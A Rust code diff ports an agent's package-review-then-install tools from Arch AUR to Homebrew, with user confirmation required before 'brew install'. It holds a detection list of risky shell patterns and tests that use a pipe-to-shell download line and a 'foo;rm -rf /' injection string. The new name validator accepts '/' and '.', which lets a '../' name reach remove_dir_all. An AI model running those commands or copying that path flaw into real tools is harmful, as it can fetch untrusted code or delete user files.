@@ -1,7 +1,10 @@
+//! Homebrew 包审查与安装:review_brew_package 拉取 formula/cask 源码做安全
+//! 审查并记录审查状态;install_brew_package 仅在用户看过审查并明确确认后
+//! 才执行 `brew install`。审查与安装必须分属不同轮次(guard 强制)。
+
 use super::{ToolRegistry, ToolSpec};
-use crate::paths::MiyuPaths;
+use crate::paths::GQYPaths;
 use anyhow::{bail, Context, Result};
-use flate2::read::GzDecoder;
 use serde_json::{json, Value};
 use std::path::{Path, PathBuf};
 use std::process::Stdio;
@@ -14,234 +17,184 @@ const MAX_FILE_CHARS: usize = 24_000;
 const MAX_FILES: usize = 80;
 const FETCH_TIMEOUT_SECONDS: u64 = 120;
 const INSTALL_TIMEOUT_SECONDS: u64 = 900;
-const MAKEPKG_TIMEOUT_SECONDS: u64 = 1800;
 
-pub fn register(registry: &mut ToolRegistry, paths: MiyuPaths) {
+const FORMULAE_API_BASE: &str = "https://formulae.brew.sh/api";
+const CORE_FORMULA_RAW: &str = "https://raw.githubusercontent.com/Homebrew/homebrew-core/HEAD/Formula";
+const CORE_CASK_RAW: &str = "https://raw.githubusercontent.com/Homebrew/homebrew-cask/HEAD/Casks";
+
+pub fn register(registry: &mut ToolRegistry, paths: GQYPaths) {
     let review_paths = paths.clone();
     registry.register(ToolSpec::new(
-        "review_aur_package",
-        "Fetch AUR build files and prepare a PKGBUILD security review. After review, stop and ask the user whether to install; do not call install_aur_package in the same turn.",
-        json!({"type":"object","properties":{"package":{"type":"string","description":"AUR package name."}},"required":["package"],"additionalProperties":false}),
+        "review_brew_package",
+        "Fetch a Homebrew formula/cask source and prepare a security review. After review, stop and ask the user whether to install; do not call install_brew_package in the same turn.",
+        json!({"type":"object","properties":{"package":{"type":"string","description":"Homebrew formula or cask name, e.g. ripgrep or visual-studio-code."}},"required":["package"],"additionalProperties":false}),
         move |args| {
             let paths = review_paths.clone();
-            async move { review_aur_package(args, paths).await }
+            async move { review_brew_package(args, paths).await }
         },
     ));
     let install_paths = paths.clone();
     registry.register(ToolSpec::new(
-        "install_aur_package",
-        "Install an AUR package only after review_aur_package recorded an allowed review state and the user explicitly confirmed installation in a later reply. Requires user_confirmed=true. Tries paru, then yay, then AUR snapshot + makepkg + pacman -U fallback.",
-        json!({"type":"object","properties":{"package":{"type":"string","description":"AUR package name."},"user_confirmed":{"type":"boolean","description":"Set true only when the user explicitly confirmed installation after seeing the review."}},"required":["package","user_confirmed"],"additionalProperties":false}),
+        "install_brew_package",
+        "Install a Homebrew package only after review_brew_package recorded an allowed review state and the user explicitly confirmed installation in a later reply. Requires user_confirmed=true. Runs `brew install`.",
+        json!({"type":"object","properties":{"package":{"type":"string","description":"Homebrew formula or cask name."},"user_confirmed":{"type":"boolean","description":"Set true only when the user explicitly confirmed installation after seeing the review."}},"required":["package","user_confirmed"],"additionalProperties":false}),
         move |args| {
             let paths = install_paths.clone();
-            async move { install_aur_package(args, paths).await }
+            async move { install_brew_package(args, paths).await }
         },
     ).writes());
 }
 
-async fn review_aur_package(args: Value, paths: MiyuPaths) -> Result<String> {
+async fn review_brew_package(args: Value, paths: GQYPaths) -> Result<String> {
     let package = required(&args, "package")?;
     validate_package_name(&package)?;
-    let metadata = fetch_aur_metadata(&package).await?;
-    let root = paths.cache_dir.join("aur-review").join(&package);
+    let (kind, metadata) = fetch_brew_metadata(&package).await?;
+    let root = paths.cache_dir.join("brew-review").join(&package);
     if root.exists() {
         std::fs::remove_dir_all(&root)?;
     }
     std::fs::create_dir_all(&root)?;
-    let fetched_by = if let Some(helper) = aur_helper().await {
-        fetch_with_helper(&helper, &package, &root).await?;
-        helper
-    } else {
-        fetch_with_curl_fallback(&metadata, &root).await?;
-        "curl-fallback".to_string()
-    };
-    let build_dir = find_pkgbuild_dir(&root)?;
-    let files = review_files(&build_dir)?;
+    let fetched_by = fetch_formula_source(&package, &kind, &root).await?;
+    let files = review_files(&root, &package)?;
     let risk = heuristic_risk(&files);
     let install_allowed = risk["level"] != "high";
     record_review_state(&paths, &package, &risk, install_allowed)?;
     review_result(
-        &build_dir,
-        Some(package),
-        Some(metadata),
-        Some(fetched_by),
+        &root,
+        &package,
+        &kind,
+        &metadata,
+        &fetched_by,
         files,
-        Some(risk),
-        Some(install_allowed),
+        &risk,
+        install_allowed,
     )
 }
 
-async fn install_aur_package(args: Value, paths: MiyuPaths) -> Result<String> {
+async fn install_brew_package(args: Value, paths: GQYPaths) -> Result<String> {
     let package = required(&args, "package")?;
     if args.get("user_confirmed").and_then(Value::as_bool) != Some(true) {
-        bail!("AUR install requires explicit user confirmation after review: {package}")
+        bail!("brew install requires explicit user confirmation after review: {package}")
     }
     validate_package_name(&package)?;
     let review = review_state_for_package(&paths, &package)?
-        .ok_or_else(|| anyhow::anyhow!("AUR package must be reviewed before install: {package}"))?;
+        .ok_or_else(|| anyhow::anyhow!("Homebrew package must be reviewed before install: {package}"))?;
     if !review["install_allowed"].as_bool().unwrap_or(false) {
-        bail!("AUR package review did not allow install: {package}")
+        bail!("Homebrew package review did not allow install: {package}")
     }
     record_install_confirmation(&paths, &package)?;
     let review = review_state_for_package(&paths, &package)?
-        .ok_or_else(|| anyhow::anyhow!("AUR package must be reviewed before install: {package}"))?;
-    let result = if let Some(helper) = aur_helper().await {
-        install_with_helper(&helper, &package).await?
-    } else {
-        install_with_makepkg_fallback(&package, &paths).await?
-    };
+        .ok_or_else(|| anyhow::anyhow!("Homebrew package must be reviewed before install: {package}"))?;
+    let result = install_with_brew(&package).await?;
     Ok(serde_json::to_string_pretty(&json!({
         "ok": result["ok"].as_bool().unwrap_or(false),
         "package": package,
         "review": review,
         "install_result": result,
-        "output_instruction": "Explain that install was allowed because review_aur_package recorded an allowed review state and the user explicitly confirmed installation. Include install success or failure concisely."
+        "output_instruction": "Explain that install was allowed because review_brew_package recorded an allowed review state and the user explicitly confirmed installation. Include install success or failure concisely."
     }))?)
 }
 
 fn review_result(
     build_dir: &Path,
-    package: Option<String>,
-    metadata: Option<Value>,
-    fetched_by: Option<String>,
+    package: &str,
+    kind: &str,
+    metadata: &Value,
+    fetched_by: &str,
     files: Vec<Value>,
-    risk: Option<Value>,
-    install_allowed: Option<bool>,
+    risk: &Value,
+    install_allowed: bool,
 ) -> Result<String> {
-    if !build_dir.join("PKGBUILD").is_file() {
-        bail!("PKGBUILD not found in {}", build_dir.display());
+    if !build_dir.join(format!("{package}.rb")).is_file() {
+        bail!("formula source not found in {}", build_dir.display());
     }
     Ok(serde_json::to_string_pretty(&json!({
         "ok": true,
         "package": package,
+        "kind": kind,
         "build_dir": build_dir.display().to_string(),
         "fetched_by": fetched_by,
-        "aur_metadata": metadata,
+        "brew_metadata": metadata,
         "risk": risk,
         "install_allowed": install_allowed,
         "files_reviewed": files.iter().map(|file| &file["path"]).collect::<Vec<_>>(),
         "files": files,
         "review_rules": BREW_REVIEW_RULES,
-        "output_instruction": "Use review_rules exactly, but omit the PAC_DECISION machine-readable line in the final answer. Mention risk.level and install_allowed. Do not install, build, run makepkg, or ask follow-up questions unless required files are missing. If install_allowed is true, ask the user whether to install and stop."
+        "output_instruction": "Use review_rules exactly, but omit the machine-readable decision line in the final answer. Mention risk.level and install_allowed. Do not install, build, run brew install, or ask follow-up questions unless required files are missing. If install_allowed is true, ask the user whether to install and stop."
     }))?)
 }
 
-async fn fetch_aur_metadata(package: &str) -> Result<Value> {
-    let url = format!("https://aur.archlinux.org/rpc/v5/info?arg[]={package}");
-    let value: Value = reqwest::Client::builder()
+/// 先按 formula 查,再按 cask 查;返回 (kind, 元数据)。
+async fn fetch_brew_metadata(package: &str) -> Result<(String, Value)> {
+    let client = reqwest::Client::builder()
         .timeout(std::time::Duration::from_secs(20))
-        .build()?
-        .get(url)
-        .send()
-        .await?
-        .error_for_status()?
-        .json()
-        .await?;
-    if value["resultcount"].as_u64().unwrap_or(0) == 0 {
-        bail!("AUR package not found: {package}");
+        .build()?;
+    for kind in ["formula", "cask"] {
+        let url = format!("{FORMULAE_API_BASE}/{kind}/{}.json", urlencoding::encode(package));
+        let resp = client.get(&url).send().await?;
+        if !resp.status().is_success() {
+            continue;
+        }
+        let data: Value = resp.json().await?;
+        return Ok((kind.to_string(), data));
     }
-    Ok(value["results"][0].clone())
+    bail!("Homebrew package not found (formula or cask): {package}")
 }
 
-async fn aur_helper() -> Option<String> {
-    for helper in ["paru", "yay"] {
-        if Command::new("sh")
-            .arg("-lc")
-            .arg(format!("command -v {helper}"))
-            .stdin(Stdio::null())
-            .output()
-            .await
-            .ok()
-            .is_some_and(|output| output.status.success())
-        {
-            return Some(helper.to_string());
+/// 拉取 formula/cask 源码:优先 GitHub raw(与本地是否安装 brew 无关),
+/// 失败回退本地 `brew cat`。返回实际来源描述。
+async fn fetch_formula_source(package: &str, kind: &str, root: &Path) -> Result<String> {
+    let (repo, subdir) = match kind {
+        "cask" => ("homebrew-cask", "Casks"),
+        _ => ("homebrew-core", "Formula"),
+    };
+    let file_name = format!("{}.rb", package.split('/').last().unwrap_or(package));
+    let raw_url = format!("https://raw.githubusercontent.com/Homebrew/{repo}/HEAD/{subdir}/{file_name}");
+    let resp = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(FETCH_TIMEOUT_SECONDS))
+        .build()?
+        .get(&raw_url)
+        .send()
+        .await;
+    if let Ok(resp) = resp {
+        if resp.status().is_success() {
+            if let Ok(source) = resp.text().await {
+                std::fs::write(root.join(&file_name), source)?;
+                return Ok(format!("raw.githubusercontent.com/Homebrew/{repo}"));
+            }
         }
     }
-    None
-}
-
-async fn fetch_with_helper(helper: &str, package: &str, root: &Path) -> Result<()> {
-    let output = Command::new(helper)
-        .arg("--aur")
-        .arg("--redownload")
-        .arg("-G")
+    // 回退:本地 brew cat(覆盖第三方 tap)
+    let output = Command::new("brew")
+        .arg("cat")
         .arg(package)
-        .current_dir(root)
         .stdin(Stdio::null())
         .kill_on_drop(true)
         .output();
-    let output = command_output_with_timeout(output, helper, FETCH_TIMEOUT_SECONDS).await?;
+    let output = command_output_with_timeout(output, "brew cat", FETCH_TIMEOUT_SECONDS).await?;
     if !output.status.success() {
         bail!(
-            "{helper} failed: {}",
+            "failed to fetch formula source: {}",
             String::from_utf8_lossy(&output.stderr).trim()
         );
     }
-    Ok(())
+    let source = String::from_utf8_lossy(&output.stdout);
+    if source.trim().is_empty() {
+        bail!("brew cat returned an empty formula source for {package}");
+    }
+    std::fs::write(root.join(&file_name), source.as_bytes())?;
+    Ok("brew cat".to_string())
 }
 
-async fn fetch_with_curl_fallback(metadata: &Value, root: &Path) -> Result<()> {
-    let url_path = metadata["URLPath"]
-        .as_str()
-        .context("AUR metadata missing URLPath")?;
-    let url = format!("https://aur.archlinux.org{url_path}");
-    let bytes = reqwest::Client::builder()
-        .timeout(std::time::Duration::from_secs(30))
-        .build()?
-        .get(url)
-        .send()
-        .await?
-        .error_for_status()?
-        .bytes()
-        .await?;
-    let decoder = GzDecoder::new(std::io::Cursor::new(bytes));
-    let mut archive = tar::Archive::new(decoder);
-    archive.unpack(root)?;
-    Ok(())
-}
-
-async fn install_with_helper(helper: &str, package: &str) -> Result<Value> {
-    let output = Command::new(helper)
-        .arg("-S")
-        .arg("--noconfirm")
-        .arg("--needed")
+async fn install_with_brew(package: &str) -> Result<Value> {
+    let output = Command::new("brew")
+        .arg("install")
         .arg(package)
         .stdin(Stdio::null())
         .kill_on_drop(true)
         .output();
-    let output = command_output_with_timeout(output, helper, INSTALL_TIMEOUT_SECONDS).await?;
-    Ok(command_result(helper, output))
-}
-
-async fn install_with_makepkg_fallback(package: &str, paths: &MiyuPaths) -> Result<Value> {
-    let metadata = fetch_aur_metadata(package).await?;
-    let root = paths.cache_dir.join("aur-install").join(package);
-    if root.exists() {
-        std::fs::remove_dir_all(&root)?;
-    }
-    std::fs::create_dir_all(&root)?;
-    fetch_with_curl_fallback(&metadata, &root).await?;
-    let build_dir = find_pkgbuild_dir(&root)?;
-    let makepkg = Command::new("makepkg")
-        .arg("--noconfirm")
-        .current_dir(&build_dir)
-        .stdin(Stdio::null())
-        .kill_on_drop(true)
-        .output();
-    let makepkg = command_output_with_timeout(makepkg, "makepkg", MAKEPKG_TIMEOUT_SECONDS).await?;
-    if !makepkg.status.success() {
-        return Ok(command_result("makepkg", makepkg));
-    }
-    let package_file = find_built_package(&build_dir)?;
-    let pacman = Command::new("pacman")
-        .arg("-U")
-        .arg("--noconfirm")
-        .arg(&package_file)
-        .stdin(Stdio::null())
-        .kill_on_drop(true)
-        .output();
-    let pacman = command_output_with_timeout(pacman, "pacman -U", INSTALL_TIMEOUT_SECONDS).await?;
-    Ok(command_result("pacman -U", pacman))
+    let output = command_output_with_timeout(output, "brew install", INSTALL_TIMEOUT_SECONDS).await?;
+    Ok(command_result("brew install", output))
 }
 
 async fn command_output_with_timeout(
@@ -265,41 +218,9 @@ fn command_result(command: &str, output: std::process::Output) -> Value {
     })
 }
 
-fn find_built_package(build_dir: &Path) -> Result<PathBuf> {
-    let mut packages = Vec::new();
-    for entry in std::fs::read_dir(build_dir)? {
-        let entry = entry?;
-        let path = entry.path();
-        let Some(name) = path.file_name().and_then(|name| name.to_str()) else {
-            continue;
-        };
-        if name.contains(".pkg.tar") {
-            packages.push(path);
-        }
-    }
-    packages
-        .into_iter()
-        .next()
-        .ok_or_else(|| anyhow::anyhow!("makepkg did not produce a package archive"))
-}
-
-fn find_pkgbuild_dir(root: &Path) -> Result<PathBuf> {
-    if root.join("PKGBUILD").is_file() {
-        return Ok(root.to_path_buf());
-    }
-    for entry in std::fs::read_dir(root)? {
-        let entry = entry?;
-        if entry.file_type()?.is_dir() && entry.path().join("PKGBUILD").is_file() {
-            return Ok(entry.path());
-        }
-    }
-    bail!("PKGBUILD not found after fetching AUR snapshot")
-}
-
-fn review_files(build_dir: &Path) -> Result<Vec<Value>> {
+fn review_files(build_dir: &Path, package: &str) -> Result<Vec<Value>> {
     let mut files = Vec::new();
-    collect_file(build_dir, Path::new("PKGBUILD"), &mut files)?;
-    collect_file(build_dir, Path::new(".SRCINFO"), &mut files).ok();
+    collect_file(build_dir, Path::new(&format!("{package}.rb")), &mut files)?;
     for entry in walk_limited(build_dir, 2)? {
         if files.len() >= MAX_FILES {
             break;
@@ -368,10 +289,8 @@ fn should_review_extra_file(path: &Path) -> bool {
         path.extension()
             .and_then(|ext| ext.to_str())
             .unwrap_or_default(),
-        "install" | "patch" | "diff" | "sh" | "service" | "timer" | "socket" | "desktop"
+        "rb" | "patch" | "diff" | "sh" | "service" | "plist" | "desktop"
     ) || name.ends_with(".install")
-        || name.contains("sysusers")
-        || name.contains("tmpfiles")
 }
 
 fn heuristic_risk(files: &[Value]) -> Value {
@@ -385,14 +304,15 @@ fn heuristic_risk(files: &[Value]) -> Value {
             "wget ",
             "| sh",
             "|sh",
+            "eval \"$(",
             "chmod 777",
-            "chown root",
-            "setcap ",
-            "systemctl enable",
             "rm -rf /",
-            "skipsums",
-            "sha256sums=('skip'",
-            "sha256sums=(\"skip\"",
+            "sudo ",
+            "osascript",
+            "launchctl",
+            "systemctl",
+            "no_check",
+            "base64 --decode",
         ] {
             if lower.contains(pattern) {
                 findings.push(json!({"file": path, "pattern": pattern}));
@@ -413,8 +333,8 @@ fn heuristic_risk(files: &[Value]) -> Value {
     json!({"level": level, "findings": findings})
 }
 
-pub fn clear_aur_review_state(paths: &MiyuPaths) -> Result<()> {
-    let path = aur_review_state_path(paths);
+pub fn clear_brew_review_state(paths: &GQYPaths) -> Result<()> {
+    let path = brew_review_state_path(paths);
     if path.exists() {
         std::fs::remove_file(path)?;
     }
@@ -422,7 +342,7 @@ pub fn clear_aur_review_state(paths: &MiyuPaths) -> Result<()> {
 }
 
 fn record_review_state(
-    paths: &MiyuPaths,
+    paths: &GQYPaths,
     package: &str,
     risk: &Value,
     install_allowed: bool,
@@ -437,40 +357,42 @@ fn record_review_state(
         "user_confirmed_install": false,
     });
     std::fs::write(
-        aur_review_state_path(paths),
-        format!("{}\n", serde_json::to_string_pretty(&state)?),
+        brew_review_state_path(paths),
+        format!("{}
+", serde_json::to_string_pretty(&state)?),
     )?;
     Ok(())
 }
 
-fn review_state_for_package(paths: &MiyuPaths, package: &str) -> Result<Option<Value>> {
+fn review_state_for_package(paths: &GQYPaths, package: &str) -> Result<Option<Value>> {
     Ok(load_review_state(paths)?.get(package).cloned())
 }
 
-fn record_install_confirmation(paths: &MiyuPaths, package: &str) -> Result<()> {
+fn record_install_confirmation(paths: &GQYPaths, package: &str) -> Result<()> {
     let mut state = load_review_state(paths)?;
     let Some(entry) = state.get_mut(package) else {
-        bail!("AUR package must be reviewed before install: {package}")
+        bail!("Homebrew package must be reviewed before install: {package}")
     };
     entry["user_confirmed_install"] = json!(true);
     entry["user_confirmed_at_unix"] = json!(current_unix_seconds());
     std::fs::write(
-        aur_review_state_path(paths),
-        format!("{}\n", serde_json::to_string_pretty(&state)?),
+        brew_review_state_path(paths),
+        format!("{}
+", serde_json::to_string_pretty(&state)?),
     )?;
     Ok(())
 }
 
-fn load_review_state(paths: &MiyuPaths) -> Result<Value> {
-    let path = aur_review_state_path(paths);
+fn load_review_state(paths: &GQYPaths) -> Result<Value> {
+    let path = brew_review_state_path(paths);
     if !path.exists() {
         return Ok(json!({}));
     }
     Ok(serde_json::from_str(&std::fs::read_to_string(path)?)?)
 }
 
-fn aur_review_state_path(paths: &MiyuPaths) -> PathBuf {
-    paths.state_dir.join("aur-review-state.json")
+fn brew_review_state_path(paths: &GQYPaths) -> PathBuf {
+    paths.state_dir.join("brew-review-state.json")
 }
 
 fn current_unix_seconds() -> u64 {
@@ -484,7 +406,7 @@ fn validate_package_name(package: &str) -> Result<()> {
     if package.is_empty()
         || !package
             .chars()
-            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '+' | '.'))
+            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '+' | '.' | '/'))
     {
         bail!("invalid package name: {package}");
     }
@@ -508,16 +430,16 @@ mod tests {
     use super::*;
 
     #[test]
-    fn validates_aur_package_names() {
-        assert!(validate_package_name("paru").is_ok());
-        assert!(validate_package_name("foo-bar_git+1.0").is_ok());
+    fn validates_brew_package_names() {
+        assert!(validate_package_name("ripgrep").is_ok());
+        assert!(validate_package_name("visual-studio-code").is_ok());
         assert!(validate_package_name("foo;rm -rf /").is_err());
     }
 
     #[test]
     fn selects_extra_review_files() {
-        assert!(should_review_extra_file(Path::new("foo.install")));
-        assert!(should_review_extra_file(Path::new("app.service")));
+        assert!(should_review_extra_file(Path::new("foo.rb")));
+        assert!(should_review_extra_file(Path::new("app.plist")));
         assert!(should_review_extra_file(Path::new("fix.patch")));
         assert!(!should_review_extra_file(Path::new("README.md")));
     }
@@ -525,9 +447,16 @@ mod tests {
     #[test]
     fn heuristic_risk_blocks_pipe_to_shell() {
         let files =
-            vec![json!({"path":"PKGBUILD", "content":"curl https://example.test/install.sh | sh"})];
+            vec![json!({"path":"ripgrep.rb", "content":"system \"curl https://example.test/install.sh | sh\""})];
         let risk = heuristic_risk(&files);
         assert_eq!(risk["level"], "high");
+    }
+
+    #[test]
+    fn heuristic_risk_flags_network_and_no_check_as_medium() {
+        let files = vec![json!({"path":"foo.rb", "content":"url \"http://example.test/foo.tar.gz\"\nsha256 \"no_check\""})];
+        let risk = heuristic_risk(&files);
+        assert_eq!(risk["level"], "medium");
     }
 
     #[test]
@@ -542,7 +471,7 @@ mod tests {
         record_install_confirmation(&paths, "foo").unwrap();
         let state = review_state_for_package(&paths, "foo").unwrap().unwrap();
         assert_eq!(state["user_confirmed_install"], true);
-        clear_aur_review_state(&paths).unwrap();
+        clear_brew_review_state(&paths).unwrap();
         assert!(review_state_for_package(&paths, "foo").unwrap().is_none());
     }
 
@@ -553,8 +482,8 @@ mod tests {
         assert!(record_install_confirmation(&paths, "foo").is_err());
     }
 
-    fn test_paths(state_dir: PathBuf) -> MiyuPaths {
-        MiyuPaths {
+    fn test_paths(state_dir: PathBuf) -> GQYPaths {
+        GQYPaths {
             root_dir: PathBuf::new(),
             config_dir: PathBuf::new(),
             config_file: PathBuf::new(),
